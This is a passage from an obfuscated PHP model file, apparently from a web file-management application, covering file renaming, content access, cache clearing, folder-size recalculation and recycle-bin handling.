Model($“ãõé∏[1942])->removeBySource($ﬂå•©ÄÕ); Model($“ãõé∏[2249])->removeBySource($ﬂå•©ÄÕ); $this->where($µ∂µ±Ü®)->delete(); Model($“ãõé∏[552])->remove($´Ø¥˜ï¡); for ($ıÊËµÙª = 0; $ıÊËµÙª < count($ﬂå•©ÄÕ); $ıÊËµÙª++) { $this->sourceCacheClear($ﬂå•©ÄÕ[$ıÊËµÙª]); } } public function rename($üÉ£«®¸, $Ó˝¢Ü”ó) { $õÒ©⁄ûä =& $_SERVER[ß⁄ˆÇ†Œ]; $Ú¯™“—Â = $this->sourceInfo($üÉ£«®¸); if (!$Ú¯™“—Â) { return !1; } $®î¬Ü˚æ = $this->fileNameExist($Ú¯™“—Â[$õÒ©⁄ûä[192]], $Ó˝¢Ü”ó); if ($®î¬Ü˚æ && $®î¬Ü˚æ != $üÉ£«®¸) { return !1; } $—ÄÊ¢¶Ã = array($õÒ©⁄ûä[502] => $Ó˝¢Ü”ó, $õÒ©⁄ûä[659] => USER_ID); if ($Ú¯™“—Â[$õÒ©⁄ûä[493]] != $õÒ©⁄ûä[91]) { $—ÄÊ¢¶Ã[$õÒ©⁄ûä[494]] = substr(get_path_ext($Ó˝¢Ü”ó), 0, 10); } Model($õÒ©⁄ûä[641])->eventRename($üÉ£«®¸, $Ú¯™“—Â[$õÒ©⁄ûä[32]], $Ó˝¢Ü”ó); $this->sourceCacheClear($üÉ£«®¸); $this->setNamePinyin($üÉ£«®¸, $—ÄÊ¢¶Ã[$õÒ©⁄ûä[32]], !1); $this->updateModifyTime($Ú¯™“—Â[$õÒ©⁄ûä[192]]); $≈≤Œ›◊í = $this->where(array($õÒ©⁄ûä[499] => $üÉ£«®¸))->data($—ÄÊ¢¶Ã)->save(); $™¡ö’ö = $õÒ©⁄ûä[2257] . $Ú¯™“—Â[$õÒ©⁄ûä[192]]; if (isset(self::$cacheChildList[$™¡ö’ö])) { unset(self::$cacheChildList[$™¡ö’ö]); } return $≈≤Œ›◊í; } public function setNamePinyin($µÙÁñÙ°, $¶¬ÃÎŒó, $à≤ΩÏßÑ = true) { $˙€”‰‡ﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; $±§¥úËè = Input::check($¶¬ÃÎŒó, $˙€”‰‡ﬂ[663]); $˛ü÷∫áû = array($˙€”‰‡ﬂ[525] => KodSort::makeStr($¶¬ÃÎŒó)); if ($±§¥úËè) { $˛ü÷∫áû[$˙€”‰‡ﬂ[546]] = str_replace($˙€”‰‡ﬂ[53], $˙€”‰‡ﬂ[12], Pinyin::get($¶¬ÃÎŒó)); $˛ü÷∫áû[$˙€”‰‡ﬂ[545]] = Pinyin::get($¶¬ÃÎŒó, $˙€”‰‡ﬂ[664]); } if (!$à≤ΩÏßÑ && !$±§¥úËè) { $˛ü÷∫áû[$˙€”‰‡ﬂ[546]] = null; $˛ü÷∫áû[$˙€”‰‡ﬂ[545]] = null; } $this->metaSet($µÙÁñÙ°, $˛ü÷∫áû); } public function getContent($◊È‹ÈïÂ) { $¶àåˆ£Á =& $_SERVER[ß⁄ˆÇ†Œ]; $ı—±ÿÑÌ = $this->fileInfoGet($◊È‹ÈïÂ); if (!$ı—±ÿÑÌ) { return !1; } if ($ı—±ÿÑÌ[$¶àåˆ£Á[79]] == 0) { return $¶àåˆ£Á[12]; } $∂˝Áì◊œ = $¶àåˆ£Á[2272] . $ı—±ÿÑÌ[$¶àåˆ£Á[555]]; if ($ı—±ÿÑÌ[$¶àåˆ£Á[79]] <= 1024 * 10) { $‹€‹˝í¥ = Cache::get($∂˝Áì◊œ); if (!$‹€‹˝í¥) { $‹€‹˝í¥ = IO::getContent($ı—±ÿÑÌ[$¶àåˆ£Á[87]]); Cache::set($∂˝Áì◊œ, $‹€‹˝í¥); } return $‹€‹˝í¥; } if (!$ı—±ÿÑÌ[$¶àåˆ£Á[87]]) { return $¶àåˆ£Á[12]; } return IO::getContent($ı—±ÿÑÌ[$¶àåˆ£Á[87]]); } public function setDesc($ÿ™„¢˝⁄, $Ï≠§—µ‡) { $¸≈Çª§¬ =& $_SERVER[ß⁄ˆÇ†Œ]; Model($¸≈Çª§¬[641])->eventAddDesc($ÿ™„¢˝⁄, $Ï≠§—µ‡); return $this->metaSet($ÿ™„¢˝⁄, $¸≈Çª§¬[534], $Ï≠§—µ‡); } public function setContent($àÅì◊ˆË, $üïÜÛˆÛ = '') { $§’ûÊ¨å =& $_SERVER[ß⁄ˆÇ†Œ]; $‘‡°¢≥Ê = $this->sourceInfo($àÅì◊ˆË); $‡ˆä‡¯ = $this->fileInfoGet($àÅì◊ˆË); if (!$‡ˆä‡¯ || !$‘‡°¢≥Ê) { return !1; } $≈’˘ÀÍ’ = Model($§’ûÊ¨å[552])->addFileByContent($üïÜÛˆÛ, $‘‡°¢≥Ê[$§’ûÊ¨å[32]]); $»—âáœì = $this->fileHistory($‘‡°¢≥Ê, $≈’˘ÀÍ’[$§’ûÊ¨å[549]], $≈’˘ÀÍ’[$§’ûÊ¨å[79]]); if (!$»—âáœì) { return Model($§’ûÊ¨å[552])->remove($≈’˘ÀÍ’[$§’ûÊ¨å[549]]); } $this->folderSizeReset($‘‡°¢≥Ê[$§’ûÊ¨å[192]]); return !0; } public function fileSubstr($Êœ∂ûõŸ, $ï’∫úŸœ, $ßœ∏ÜØã) { $ºÎ± ÁÂ = $this->fileInfoGet($Êœ∂ûõŸ); if (!$ºÎ± ÁÂ) { return !1; } return IO::fileSubstr($ºÎ± ÁÂ[$_SERVER[ß⁄ˆÇ†Œ][87]], $ï’∫úŸœ, $ßœ∏ÜØã); } public function fileInfoGet($¿ÀµâÖ¶) { $“…‚®…ù =& $_SERVER[ß⁄ˆÇ†Œ]; $È¨˘áÖ≈ = $this->sourceInfo($¿ÀµâÖ¶); if (!$È¨˘áÖ≈ || $È¨˘áÖ≈[$“…‚®…ù[493]]) { return !1; } $±Ùîƒ÷ª = $“…‚®…ù[556] . $È¨˘áÖ≈[$“…‚®…ù[549]]; $ﬁù‡âù¡ = _get(self::$cacheFileInfo, $±Ùîƒ÷ª); if ($ﬁù‡âù¡) { return $ﬁù‡âù¡; } $„·ÆÎËå = Model($“…‚®…ù[552])->fileInfo($È¨˘áÖ≈[$“…‚®…ù[549]]); if ($„·ÆÎËå) { $„·ÆÎËå[$“…‚®…ù[32]] = $È¨˘áÖ≈[$“…‚®…ù[32]]; } self::$cacheFileInfo[$±Ùîƒ÷ª] = $„·ÆÎËå; return $„·ÆÎËå; } private function folderChildrenNumber($ﬁóÖœ÷ó) { $ÏŸäâÇÄ =& $_SERVER[ß⁄ˆÇ†Œ]; $ê¨±˙‰€ = $this->sourceInfo($ﬁóÖœ÷ó); $∞ã®¬º≤ = array($ÏŸäâÇÄ[660] => array($ÏŸäâÇÄ[620], $ê¨±˙‰€[$ÏŸäâÇÄ[592]] . $ﬁóÖœ÷ó . $ÏŸäâÇÄ[621]), $ÏŸäâÇÄ[657] => $ê¨±˙‰€[$ÏŸäâÇÄ[577]], $ÏŸäâÇÄ[512] => intval($ê¨±˙‰€[$ÏŸäâÇÄ[513]]), $ÏŸäâÇÄ[654] => 1); $Ÿ€æÓπ‡ = $this->where($∞ã®¬º≤)->count(); $ñ£ÓÈÌÜ = $this->where($∞ã®¬º≤)->where(array($ÏŸäâÇÄ[654] => 0))->count(); return array($ÏŸäâÇÄ[83] => $ñ£ÓÈÌÜ, $ÏŸäâÇÄ[84] => $Ÿ€æÓπ‡); } public function pathInfo($’’é›Ë˚, $˚‚˙◊èÂ = false) { $◊Úˆ‰¨Æ =& $_SERVER[ß⁄ˆÇ†Œ]; $˚‚˙◊èÂ = !1; $’’é›Ë˚ = intval($’’é›Ë˚); $≥æ…ÀÏÇ = $◊Úˆ‰¨Æ[542] . intval($˚‚˙◊èÂ) . $◊Úˆ‰¨Æ[470] . $’’é›Ë˚; $œä˜Äùπ = _get(self::$cachePathInfo, $≥æ…ÀÏÇ); if ($œä˜Äùπ) { return $œä˜Äùπ; } $ë‚Öî¨‰ = $this->sourceInfo($’’é›Ë˚); if (!$ë‚Öî¨‰) { return !1; } $ë‚Öî¨‰ = $this->_listDataApplyItem($ë‚Öî¨‰, $˚‚˙◊èÂ); self::$cachePathInfo[$≥æ…ÀÏÇ] = $ë‚Öî¨‰; return $ë‚Öî¨‰; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ññ†é˛ë) { $Ï°œâ ê =& $_SERVER[ß⁄ˆÇ†Œ]; $¡π˚ßï˚ = _get(self::$cachePathInfoMore, $Ññ†é˛ë); if ($¡π˚ßï˚) { return $¡π˚ßï˚; } $èãØ¸É∫ = $this->pathInfo($Ññ†é˛ë); if (!$èãØ¸É∫) { return !1; } if ($èãØ¸É∫[$Ï°œâ ê[493]] == $Ï°œâ ê[91]) { $èãØ¸É∫[$Ï°œâ ê[82]] = $this->folderChildrenNumber($Ññ†é˛ë); } self::$cachePathInfoMore[$Ññ†é˛ë] = $èãØ¸É∫; return $èãØ¸É∫; } public function sourceInfo($Ó˜‡üÜ®) { $ò≠≥á‡ä =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Ó˜‡üÜ®) { return array(); } $Ó˜‡üÜ® = intval($Ó˜‡üÜ®); $è•ÄŸÿ∂ = $ò≠≥á‡ä[541] . $Ó˜‡üÜ®; $é˛ø≥ß“ = _get(self::$cacheSourceInfo, $è•ÄŸÿ∂); if ($é˛ø≥ß“) { return $é˛ø≥ß“; } $ﬂ†∫Æ’Â = $this->where(array($ò≠≥á‡ä[193] => $Ó˜‡üÜ®))->find(); self::$cacheSourceInfo[$è•ÄŸÿ∂] = $ﬂ†∫Æ’Â; return self::$cacheSourceInfo[$è•ÄŸÿ∂]; } public function sourceCacheClear($À≠Äı¶• = false) { self::cacheClear($À≠Äı¶•); } public static function cacheClear($•ÙÏ›∞  = false) { $…ùáËé◊ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($•ÙÏ›∞  == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$…ùáËé◊[541] . $•ÙÏ›∞ ]); unset(self::$cachePathInfoMore[$•ÙÏ›∞ ]); unset(self::$cachePathInfo[$…ùáËé◊[2273] . $•ÙÏ›∞ ]); unset(self::$cachePathInfo[$…ùáËé◊[2274] . $•ÙÏ›∞ ]); } public function metaSet($Œ¿ˆÚ¡Ç, $‹ÇÔ¯å∏ = null, $¯ü≤É∏« = null) { $Äº∂ø≤ü = parent::metaSet($Œ¿ˆÚ¡Ç, $‹ÇÔ¯å∏, $¯ü≤É∏«); if ($Äº∂ø≤ü) { $this->sourceCacheClear($Œ¿ˆÚ¡Ç); } return $Äº∂ø≤ü; } public function pathInfoByPath($‰«à•é‡, $Ã„™Üµï) { $‰ÜÅ‹“à =& $_SERVER[ß⁄ˆÇ†Œ]; $õô® ·∏ = !$Ã„™Üµï ? array() : explode($‰ÜÅ‹“à[8], trim($Ã„™Üµï, $‰ÜÅ‹“à[8])); $•°œ“Ó∂ = $‰«à•é‡; foreach ($õô® ·∏ as $ûã’«â˚) { $¶Ñ®œà‡ = array($‰ÜÅ‹“à[192] => $•°œ“Ó∂, $‰ÜÅ‹“à[32] => $ûã’«â˚); $≥Å˝˚ºì = $this->field($‰ÜÅ‹“à[2275])->where($¶Ñ®œà‡)->select(); if (!$≥Å˝˚ºì) { return !1; } $≥Å˝˚ºì = array_sort_by($≥Å˝˚ºì, $‰ÜÅ‹“à[513]); $•°œ“Ó∂ = $≥Å˝˚ºì[0][$‰ÜÅ‹“à[193]]; } $÷˛‰ÖÖÇ = $this->sourceInfo($•°œ“Ó∂); $this->pathInfoFilter($÷˛‰ÖÖÇ); return $÷˛‰ÖÖÇ; } protected function updateModifyTime($£±·©»ç) { $ÅÏ»áÊœ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ô¸Ë«åö = defined($ÅÏ»áÊœ[2189]) ? USER_ID : 0; if (!$£±·©»ç) { return; } if (!is_array($£±·©»ç)) { $£±·©»ç = array($£±·©»ç); } foreach ($£±·©»ç as $ñù´Œúõ => $∑—ó∞Ïô) { $£±·©»ç[$ñù´Œúõ] = intval($∑—ó∞Ïô); $this->sourceCacheClear($∑—ó∞Ïô); } $°ñ™„õû = array($ÅÏ»áÊœ[193] => array($ÅÏ»áÊœ[7], $£±·©»ç)); $ΩΩ≠ÙëÃ = array($ÅÏ»áÊœ[659] => $Ô¸Ë«åö, $ÅÏ»áÊœ[506] => time()); $this->where($°ñ™„õû)->save($ΩΩ≠ÙëÃ); } public function folderSizeReset($¶ÿÓá€°, $î∫ÏŒƒÖ = false) { $¨»Ö «Ù =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->statusIgnoreResetSpace) { return; } $∫≠•úƒü = $this->sourceInfo($¶ÿÓá€°); $≠æ•ˆ∂˜ = $¨»Ö «Ù[2276] . $¶ÿÓá€°; CacheLock::lock($≠æ•ˆ∂˜, 20); if ($î∫ÏŒƒÖ === !1) { $this->sourceCacheClear($¶ÿÓá€°); $∫≠•úƒü = $this->sourceInfo($¶ÿÓá€°); $∑ö¿˚è≈ = array($¨»Ö «Ù[485] => $¶ÿÓá€°, $¨»Ö «Ù[512] => 0); $ó›°“±˚ = $this->where($∑ö¿˚è≈)->sum($¨»Ö «Ù[79]); $î∫ÏŒƒÖ = intval($ó›°“±˚) - intval($∫≠•úƒü[$¨»Ö «Ù[79]]); } if ($î∫ÏŒƒÖ == 0) { return CacheLock::unlock($≠æ•ˆ∂˜); } $¶Á¨Ø‚Ÿ = $this->parentLevelArray($∫≠•úƒü[$¨»Ö «Ù[592]]); if (!$¶Á¨Ø‚Ÿ) { $¶Á¨Ø‚Ÿ = array(); } $¶Á¨Ø‚Ÿ[] = $∫≠•úƒü[$¨»Ö «Ù[193]]; $∑ö¿˚è≈ = array($¨»Ö «Ù[193] => array($¨»Ö «Ù[500], $¶Á¨Ø‚Ÿ)); if ($î∫ÏŒƒÖ < 0) { $∑ö¿˚è≈[$¨»Ö «Ù[79]] = array($¨»Ö «Ù[1089], abs($î∫ÏŒƒÖ)); } $this->where($∑ö¿˚è≈)->setAdd($¨»Ö «Ù[79], $î∫ÏŒƒÖ); CacheLock::unlock($≠æ•ˆ∂˜); $¿ó¥ƒÙù = $¨»Ö «Ù[2277] . $∫≠•úƒü[$¨»Ö «Ù[190]] . $¨»Ö «Ù[4] . $∫≠•úƒü[$¨»Ö «Ù[577]]; $æ˜ÀÚ∏Å = array($∫≠•úƒü[$¨»Ö «Ù[190]], $∫≠•úƒü[$¨»Ö «Ù[577]]); TaskRun::timeLimitCall($¿ó¥ƒÙù, $¨»Ö «Ù[2278], $æ˜ÀÚ∏Å, 1.5); } public function folderSizeResetChildren($É© ˙∫º) { $ö‚≤ã”î =& $_SERVER[ß⁄ˆÇ†Œ]; $this->sourceCacheClear($É© ˙∫º); $˜ºŸˆÏ° = $this->sourceInfo($É© ˙∫º); $Âåè®…ä = array($ö‚≤ã”î[654] => 1, $ö‚≤ã”î[657] => $˜ºŸˆÏ°[$ö‚≤ã”î[577]], $ö‚≤ã”î[660] => array($ö‚≤ã”î[620], $˜ºŸˆÏ°[$ö‚≤ã”î[592]] . $É© ˙∫º . $ö‚≤ã”î[621])); $±∑•óµø = $ö‚≤ã”î[2279]; $ºøÚ≠∞´ = $this->field($±∑•óµø)->where($Âåè®…ä)->select(); $Âåè®…ä[$ö‚≤ã”î[493]] = 0; $Î”èÆœÍ = $this->field($±∑•óµø)->where($Âåè®…ä)->select(); if (!$Î”èÆœÍ) { return; } $ºøÚ≠∞´[] = $˜ºŸˆÏ°; $ºøÚ≠∞´ = array_to_keyvalue($ºøÚ≠∞´, $ö‚≤ã”î[193]); foreach ($ºøÚ≠∞´ as $àﬁÓ€‘› => $‘î¶¿ú¨) { $ºøÚ≠∞´[$àﬁÓ€‘›][$ö‚≤ã”î[2280]] = $ºøÚ≠∞´[$àﬁÓ€‘›][$ö‚≤ã”î[79]]; $ºøÚ≠∞´[$àﬁÓ€‘›][$ö‚≤ã”î[79]] = 0; } foreach ($Î”èÆœÍ as $‘î¶¿ú¨) { $™…‘Ñüô = $‘î¶¿ú¨[$ö‚≤ã”î[192]] . $ö‚≤ã”î[12]; if (!isset($ºøÚ≠∞´[$™…‘Ñüô])) { continue; } if ($‘î¶¿ú¨[$ö‚≤ã”î[513]] == $ºøÚ≠∞´[$™…‘Ñüô][$ö‚≤ã”î[513]]) { $ºøÚ≠∞´[$™…‘Ñüô][$ö‚≤ã”î[79]] += $‘î¶¿ú¨[$ö‚≤ã”î[79]]; } } foreach ($ºøÚ≠∞´ as $‘î¶¿ú¨) { $√‹Ù›°≤ = $this->parentLevelArray($‘î¶¿ú¨[$ö‚≤ã”î[592]]); foreach ($√‹Ù›°≤ as $™…‘Ñüô) { $™…‘Ñüô = $™…‘Ñüô . $ö‚≤ã”î[12]; if (!isset($ºøÚ≠∞´[$™…‘Ñüô])) { continue; } if ($‘î¶¿ú¨[$ö‚≤ã”î[513]] == $ºøÚ≠∞´[$™…‘Ñüô][$ö‚≤ã”î[513]]) { $ºøÚ≠∞´[$™…‘Ñüô][$ö‚≤ã”î[79]] += $‘î¶¿ú¨[$ö‚≤ã”î[79]]; } } } $ó≈ÿ‚è◊ = array(); foreach ($ºøÚ≠∞´ as $‘î¶¿ú¨) { if ($‘î¶¿ú¨[$ö‚≤ã”î[79]] == $‘î¶¿ú¨[$ö‚≤ã”î[2280]]) { continue; } $ó≈ÿ‚è◊[] = array($ö‚≤ã”î[193], $‘î¶¿ú¨[$ö‚≤ã”î[193]], $ö‚≤ã”î[79], $‘î¶¿ú¨[$ö‚≤ã”î[79]]); } $this->saveAll($ó≈ÿ‚è◊); } public function userSpaceReset($„®ü™êﬁ = false) { $ù◊¬∂•˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $çºΩ£äû = $this->where(array($ù◊¬∂•˘[190] => self::TYPE_USER, $ù◊¬∂•˘[577] => $„®ü™êﬁ, $ù◊¬∂•˘[493] => 0))->sum($ù◊¬∂•˘[79]); $çºΩ£äû = !$çºΩ£äû || $çºΩ£äû <= 0 ? 0 : $çºΩ£äû; Model($ù◊¬∂•˘[585])->userEdit($„®ü™êﬁ, array($ù◊¬∂•˘[1951] => $çºΩ£äû)); } public function targetSpaceUpdate($‡öÖΩ∂÷, $Üª∆¢¯∑) { $Ö¿É¥◊  =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Üª∆¢¯∑) { return; } if (!in_array($‡öÖΩ∂÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ó´ØòÊâ = $this->targetSpaceSize($‡öÖΩ∂÷, $Üª∆¢¯∑); if ($‡öÖΩ∂÷ == self::TYPE_USER) { Model($Ö¿É¥◊ [585])->userEdit($Üª∆¢¯∑, array($Ö¿É¥◊ [1951] => $ó´ØòÊâ)); } else { if ($‡öÖΩ∂÷ == self::TYPE_GROUP) { Model($Ö¿É¥◊ [593])->groupEdit($Üª∆¢¯∑, array($Ö¿É¥◊ [1951] => $ó´ØòÊâ)); } } } public function targetSpaceSize($Î’å˛Í≠, $Úô÷È˙µ) { $“ôÎ·Ò´ =& $_SERVER[ß⁄ˆÇ†Œ]; $…ëÉ≥≥£ = 0; $ú®Òı°≈ = $this->targetSourceRoot($Î’å˛Í≠, $Úô÷È˙µ, !0); foreach ($ú®Òı°≈ as $‰Ïæ√À∑) { if (!$‰Ïæ√À∑) { continue; } $…ëÉ≥≥£ += floatval($‰Ïæ√À∑[$“ôÎ·Ò´[79]]); $èŸÀñëß = array($“ôÎ·Ò´[660] => array($“ôÎ·Ò´[620], $“ôÎ·Ò´[602] . $‰Ïæ√À∑[$“ôÎ·Ò´[193]] . $“ôÎ·Ò´[621])); $çÙÛ˙ò  = Model($“ôÎ·Ò´[511])->field($“ôÎ·Ò´[499])->where($èŸÀñëß)->select(); $çÙÛ˙ò  = array_to_keyvalue($çÙÛ˙ò , $“ôÎ·Ò´[12], $“ôÎ·Ò´[193]); $çÙÛ˙ò  = array_unique(array_filter($çÙÛ˙ò )); if ($çÙÛ˙ò ) { $èŸÀñëß = array($“ôÎ·Ò´[499] => array($“ôÎ·Ò´[500], $çÙÛ˙ò )); $…ëÉ≥≥£ += floatval($this->where($èŸÀñëß)->sum($“ôÎ·Ò´[79])); } } $…ëÉ≥≥£ = !$…ëÉ≥≥£ || $…ëÉ≥≥£ <= 0 ? 0 : $…ëÉ≥≥£; return $…ëÉ≥≥£; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($âœ±áæ°) { return $this->fileTypeProfile($âœ±áæ°, SourceModel::TYPE_USER); } public function groupFileTypeProfile($üıÚôõÈ) { return $this->fileTypeProfile($üıÚôõÈ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ìåﬂ†·∫, $ø«ıç≠‹) { $›˘ïò¿· =& $_SERVER[ß⁄ˆÇ†Œ]; $≥ƒ¢˝≤◊ = $›˘ïò¿·[2281] . $ìåﬂ†·∫ . $›˘ïò¿·[11] . $ø«ıç≠‹; $ƒ≠˘¢ã≤ = Cache::get($≥ƒ¢˝≤◊); if ($ƒ≠˘¢ã≤) { return $ƒ≠˘¢ã≤; } $´‡◊Í·• = array($›˘ïò¿·[654] => 0); if ($ìåﬂ†·∫ != !1) { $´‡◊Í·•[$›˘ïò¿·[577]] = $ìåﬂ†·∫; $´‡◊Í·•[$›˘ïò¿·[190]] = $ø«ıç≠‹; } $æ…›ﬂ‡è = array(); $æ…›ﬂ‡è[$›˘ïò¿·[2282]] = array($›˘ïò¿·[2283] => LNG($›˘ïò¿·[2282]), $›˘ïò¿·[2284] => $this->where($´‡◊Í·•)->count(), $›˘ïò¿·[625] => $this->where($´‡◊Í·•)->sum($›˘ïò¿·[79])); $êÃ◊’ø” = KodIO::fileTypeList(); foreach ($êÃ◊’ø” as $áŒï–ÂÒ => $ŒË„ÆÔ“) { $´‡◊Í·•[$›˘ïò¿·[494]] = $this->fileTypeWhere($áŒï–ÂÒ); $æ…›ﬂ‡è[$áŒï–ÂÒ] = array($›˘ïò¿·[2283] => $ŒË„ÆÔ“[$›˘ïò¿·[32]], $›˘ïò¿·[2284] => $this->where($´‡◊Í·•)->count(), $›˘ïò¿·[625] => $this->where($´‡◊Í·•)->sum($›˘ïò¿·[79])); } Cache::set($≥ƒ¢˝≤◊, $æ…›ﬂ‡è, 1200); return $æ…›ﬂ‡è; } public function fileNameExist($ïå©åö∑, $†¸Óπ’õ) { $§‡ÙÄ∞» =& $_SERVER[ß⁄ˆÇ†Œ]; $Ïà©˘‰É = $this->field($§‡ÙÄ∞»[2285])->where(array($§‡ÙÄ∞»[192] => $ïå©åö∑, $§‡ÙÄ∞»[32] => $†¸Óπ’õ, $§‡ÙÄ∞»[513] => 0))->find(); return is_array($Ïà©˘‰É) ? $Ïà©˘‰É[$§‡ÙÄ∞»[193]] : !1; } public function childList($è«Ä§ˆ”) { $ÅÚÿﬁ≈Å =& $_SERVER[ß⁄ˆÇ†Œ]; $¢≤É∂µã = $ÅÚÿﬁ≈Å[2257] . $è«Ä§ˆ”; if (isset(self::$cacheChildList[$¢≤É∂µã])) { return self::$cacheChildList[$¢≤É∂µã]; } $∑≈çüÄÂ = array($ÅÚÿﬁ≈Å[192] => intval($è«Ä§ˆ”), $ÅÚÿﬁ≈Å[513] => 0); $™•™ÒÂõ = $this->where($∑≈çüÄÂ)->select(); $™•™ÒÂõ = $™•™ÒÂõ ? $™•™ÒÂõ : array(); self::$cacheChildList[$¢≤É∂µã] = $™•™ÒÂõ; foreach ($™•™ÒÂõ as $∆”ñ«µú) { $¢≤É∂µã = $ÅÚÿﬁ≈Å[541] . $∆”ñ«µú[$ÅÚÿﬁ≈Å[193]]; self::$cacheSourceInfo[$¢≤É∂µã] = $∆”ñ«µú; } return $™•™ÒÂõ; } public function fileNameAuto($Ω™©¨¥ı, $¢ŒÀ¬ñõ, $˘ñ…º¡ï = REPEAT_RENAME, $œá˜´ÁŒ = false) { $É¡≤–Œ” =& $_SERVER[ß⁄ˆÇ†Œ]; $∆€€üûã = get_path_ext($¢ŒÀ¬ñõ); $ÜØÂË≈ò = $∆€€üûã ? get_path_ext_name($¢ŒÀ¬ñõ) . $É¡≤–Œ”[2286] . $∆€€üûã : $¢ŒÀ¬ñõ . $É¡≤–Œ”[468]; $ûßã∏’√ = array($É¡≤–Œ”[192] => $Ω™©¨¥ı, $É¡≤–Œ”[513] => 0, $É¡≤–Œ”[32] => array($É¡≤–Œ”[467], $ÜØÂË≈ò)); $¶‚àÅ¥ = $this->field($É¡≤–Œ”[32])->where($ûßã∏’√)->select(); $‹¬¶ùµ◊ = array_to_keyvalue($¶‚àÅ¥, $É¡≤–Œ”[12], $É¡≤–Œ”[32]); return $this->fileNameAutoGet($‹¬¶ùµ◊, $¢ŒÀ¬ñõ, $˘ñ…º¡ï, $œá˜´ÁŒ); } public function fileNameAutoGet($˜Ôœ∆ºè, $¸¡˙∂Ô√, $ê«È‡ùñ, $ôÔπá‡) { $ÖîÎ¬Ëà =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ê«È‡ùñ == REPEAT_REPLACE || !$˜Ôœ∆ºè || !in_array_not_case($¸¡˙∂Ô√, $˜Ôœ∆ºè) || $ôÔπá‡ && $ê«È‡ùñ != REPEAT_RENAME_FOLDER) { return $¸¡˙∂Ô√; } if ($ê«È‡ùñ == REPEAT_SKIP) { return !1; } $Ú∂¡∆ﬂÖ = $ÖîÎ¬Ëà[10] . get_path_ext($¸¡˙∂Ô√); $Ú∂¡∆ﬂÖ = $Ú∂¡∆ﬂÖ == $ÖîÎ¬Ëà[10] || $ôÔπá‡ ? $ÖîÎ¬Ëà[12] : $Ú∂¡∆ﬂÖ; for ($Àˆππﬂã = 1; $Àˆππﬂã <= count($˜Ôœ∆ºè) + 1; $Àˆππﬂã++) { $ÓÀ¯’—‚ = substr($¸¡˙∂Ô√, 0, strlen($¸¡˙∂Ô√) - strlen($Ú∂¡∆ﬂÖ)); $ú•ì•âŸ = $ÓÀ¯’—‚ . "\x28{$Àˆππﬂã}\x29{$Ú∂¡∆ﬂÖ}"; if (!in_array_not_case($ú•ì•âŸ, $˜Ôœ∆ºè)) { return $ú•ì•âŸ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145\137\x72\x65\x63\171\143\154\x65"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\151\155\x65", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\x66\x75\x6e\143\x74\x69\x6f\156")); public function listData($é±ºéë° = false) { $íäÊﬁûë =& $_SERVER[ß⁄ˆÇ†Œ]; $é±ºéë° = $é±ºéë° ? $é±ºéë° : USER_ID; $öçÔ„Ó» = $this->where(array($íäÊﬁûë[1755] => $é±ºéë°))->select(); return array_to_keyvalue($öçÔ„Ó», $íäÊﬁûë[12], $íäÊﬁûë[193]); } public function moveToRecycle($ÙÉ∑ﬁ∞ø) { $ß¯Æÿ¶— =& $_SERVER[ß⁄ˆÇ†Œ]; $æáú•Èü = Model($ß¯Æÿ¶—[1414]); $†ƒœßËˆ = $æáú•Èü->sourceInfo($ÙÉ∑ﬁ∞ø); if (!$†ƒœßËˆ || $†ƒœßËˆ[$ß¯Æÿ¶—[513]] == $ß¯Æÿ¶—[91]) { return; } $ìé™¨ÕÕ = array($ß¯Æÿ¶—[499] => $ÙÉ∑ﬁ∞ø, $ß¯Æÿ¶—[1755] => USER_ID, $ß¯Æÿ¶—[656] => $†ƒœßËˆ[$ß¯Æÿ¶—[190]], $ß¯Æÿ¶—[657] => $†ƒœßËˆ[$ß¯Æÿ¶—[577]], $ß¯Æÿ¶—[660] => $†ƒœßËˆ[$ß¯Æÿ¶—[592]]); $this->add($ìé™¨ÕÕ); $this->recycleMove($ÙÉ∑ﬁ∞ø, 1); if ($†ƒœßËˆ[$ß¯Æÿ¶—[493]] == $ß¯Æÿ¶—[91]) { $«°≈ÃÚÇ = array($ß¯Æÿ¶—[660] => array($ß¯Æÿ¶—[620], $†ƒœßËˆ[$ß¯Æÿ¶—[592]] . $ÙÉ∑ﬁ∞ø . $ß¯Æÿ¶—[621])); $æáú•Èü->where($«°≈ÃÚÇ)->setField($ß¯Æÿ¶—[513], 1); } } public function clear() { $this->remove(!1); } public function remove($∫–¥ÿé = false, $í¯±Ì‡ÿ = false) { $€⁄÷™à› =& $_SERVER[ß⁄ˆÇ†Œ]; $í¯±Ì‡ÿ = $í¯±Ì‡ÿ ? $í¯±Ì‡ÿ : USER_ID; $îÜÏ¸»ï = Model($€⁄÷™à›[1414]); $≤åÓÛ™ñ = $this->listData($í¯±Ì‡ÿ); $∫–¥ÿé = $∫–¥ÿé === !1 ? !1 : $∫–¥ÿé; $ëñ≠£∞¡ = array(); foreach ($≤åÓÛ™ñ as $´±ﬂè–Ö) { if ($∫–¥ÿé != !1 && !in_array($´±ﬂè–Ö, $∫–¥ÿé)) { continue; } $¨Ÿ°µ¬— = $îÜÏ¸»ï->sourceInfo($´±ﬂè–Ö); $îÜÏ¸»ï->remove($´±ﬂè–Ö, !1); $¢Â∞á≈Ü = $¨Ÿ°µ¬—[$€⁄÷™à›[190]] . $€⁄÷™à›[11] . $¨Ÿ°µ¬—[$€⁄÷™à›[577]]; $ëñ≠£∞¡[$¢Â∞á≈Ü] = array($€⁄÷™à›[656] => $¨Ÿ°µ¬—[$€⁄÷™à›[190]], $€⁄÷™à›[577] => $¨Ÿ°µ¬—[$€⁄÷™à›[577]]); $this->where(array($€⁄÷™à›[193] => 